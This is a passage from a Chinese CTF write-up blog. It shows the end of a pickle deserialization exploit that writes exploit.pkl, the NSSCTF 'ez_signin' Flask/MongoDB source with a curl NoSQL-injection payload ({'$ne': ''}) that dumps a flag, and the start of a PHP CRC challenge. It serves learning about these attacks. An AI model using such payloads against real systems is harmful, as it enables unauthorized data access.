punctuation">,</span> <span class="token punctuation">(</span>pathlib<span class="token punctuation">.</span>Path<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">CHIKAWA</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>model_name <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>parameters <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># 把 ReadApp 的对象序列化成 inner_payload</span>inner_payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>ReadApp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 放进 CHIKAWA 对象</span>obj <span class="token operator">=</span> CHIKAWA<span class="token punctuation">(</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>data <span class="token operator">=</span> inner_payload<span class="token comment"># 序列化 CHIKAWA 对象到文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exploit.pkl"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nss#4th</title>
      <link href="/2025/09/03/31/"/>
      <url>/2025/09/03/31/</url>
      
        <content type="html"><![CDATA[<h3 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClient<span class="token keyword">import</span> reapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>client <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span><span class="token string">"mongodb://localhost:27017/"</span><span class="token punctuation">)</span>db <span class="token operator">=</span> client<span class="token punctuation">[</span><span class="token string">'aggie_bookstore'</span><span class="token punctuation">]</span>books_collection <span class="token operator">=</span> db<span class="token punctuation">[</span><span class="token string">'books'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>input_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[^a-zA-Z0-9\s]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> input_str<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> books<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    query <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"$and"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span>    books <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        author <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'author'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        title_clean <span class="token operator">=</span> sanitize<span class="token punctuation">(</span>title<span class="token punctuation">)</span>        author_clean <span class="token operator">=</span> sanitize<span class="token punctuation">(</span>author<span class="token punctuation">)</span>        <span class="token keyword">if</span> title_clean<span class="token punctuation">:</span>            query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"$eq"</span><span class="token punctuation">:</span> title_clean<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>          <span class="token keyword">if</span> author_clean<span class="token punctuation">:</span>            query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"$eq"</span><span class="token punctuation">:</span> author_clean<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            books <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>books_collection<span class="token punctuation">.</span>find<span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> books<span class="token operator">=</span>books<span class="token punctuation">)</span>    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>content_type <span class="token operator">==</span> <span class="token string">'application/json'</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span>force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>                title <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span>                author <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"author"</span><span class="token punctuation">)</span>                                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    title <span class="token operator">=</span> sanitize<span class="token punctuation">(</span>title<span class="token punctuation">)</span>                    query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>author<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    author <span class="token operator">=</span> sanitize<span class="token punctuation">(</span>author<span class="token punctuation">)</span>                    query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>author<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">}</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> query<span class="token punctuation">[</span><span class="token string">"$and"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    books <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>books_collection<span class="token punctuation">.</span>find<span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">[</span>                        <span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> b<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"author"</span><span class="token punctuation">:</span> b<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"author"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"description"</span><span class="token punctuation">:</span> b<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> books                    <span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Empty query"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Unsupported Content-Type"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if isinstance(title, dict): query["$and"].append({"title": title})</code> —— 把用户传来的 dict 直接放入查询，允许注入 Mongo 操作符（如 <code>$ne</code>, <code>$gt</code>, <code>$regex</code> 等）。</p><ol><li>把 <code>title</code> 设为 <code>{"$ne": ""}</code>（不等于空字符串），会匹配所有 <code>title</code> 非空的文档：</li></ol><pre class="line-numbers language-none"><code class="language-none">curl -i -X POST http://node9.anna.nssctf.cn:25262/search \  -H "Content-Type: application/json" \  -d '{"title": {"$ne": ""}}'HTTP/1.1 200 OKServer: Werkzeug/3.1.3 Python/3.11.13Date: Sun, 24 Aug 2025 07:35:40 GMTContent-Type: application/jsonContent-Length: 318Connection: close[{"author":"admin","description":"NSSCTF{12a0e313-ac2b-4abf-98d8-3a33cae003db}","title":"unknown"},{"author":"John Smith","description":"A comprehensive guide to Python programming.","title":"Python Programming"},{"author":"Alice Johnson","description":"Learn about web application security.","title":"Web Security"}]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">compute_crc16</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$checksum</span> <span class="token operator">=</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$checksum</span> <span class="token operator">^=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$checksum</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$checksum</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$checksum</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xA001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$checksum</span> <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$checksum</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">calculate_crc8</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token variable">$crc8_table</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>        <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span>        <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span>        <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>        <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span>        <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span>        <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span>        <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span>        <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>        <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span>        <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span>        <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>        <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span>        <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span>        <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span>        <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span>        <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span>        <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span>        <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span>        <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span>        <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>        <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>        <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span>        <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span>        <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>        <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span>        <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span>        <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span>        <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span>        <span class="token number">0x96</span><span 